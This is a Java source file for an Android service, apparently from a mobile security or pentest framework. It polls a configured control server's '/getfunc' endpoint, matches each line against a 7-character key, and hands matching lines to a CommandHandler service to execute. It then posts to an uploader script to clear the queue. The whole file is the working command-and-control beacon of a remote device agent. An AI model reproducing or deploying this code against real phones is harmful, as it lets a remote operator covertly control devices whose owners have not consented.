package com.bulbsecurity.framework.app;


import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;



public class InternetPoll extends Service {


	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		int off = ((FrameworkAndroidApp)this.getApplication()).getstop();
		
		 if (off == 0)
    	 { 
		Log.i("AAA", "Started Internetpoll");
	
		String http = "http://";
		String controlIP = ((FrameworkAndroidApp) this.getApplication()).getcontrolIP();
		String path = ((FrameworkAndroidApp) this.getApplication()).getpath(); 
		String urii = "/getfunc";
		String uri = http.concat(controlIP);
		String uri2 = uri.concat(path);
		final String pullfrom = uri2.concat(urii);
		final String key = ((FrameworkAndroidApp) this.getApplication()).getkey();
		String url2 = "/getfuncuploader.php";
		String uri3 = http.concat(controlIP);
		String postto1 = uri3.concat(path);
		final String postto = postto1.concat(url2);
		Log.i("AAA", pullfrom);
		 new Thread() {
				public void run() {
		URL url = null;
		
			try {
				url = new URL(pullfrom);
				BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
				if (in != null)
				{
					Log.i("AAA", "Stream opened");
				String inputLine;
				while ((inputLine = in.readLine()) != null){
					Log.i("AAA", inputLine);
					
					if (inputLine.length() >= 7)
					{
						String checkkey = inputLine.substring(0,7);
						if (checkkey.equals(key))
						{
							Intent intent2 = new Intent(getApplicationContext(), CommandHandler.class);
							intent2.putExtra("message", inputLine);
							Context context = getApplicationContext();
							context.startService(intent2);
					
						}
					}
				}
				
				ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
				nameValuePairs.add(new BasicNameValuePair("text", ""));
			
					HttpClient httpclient = new DefaultHttpClient();
				
					HttpPost httppost = new HttpPost(postto);
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
					httpclient.execute(httppost);
					//HttpEntity entity = response.getEntity();
					//InputStream input = entity.getContent();
					
				in.close();
				stopSelf();
			}
			
	
				
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 	};
			}.start();
    	 }
		
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onDestroy() {
	}

}


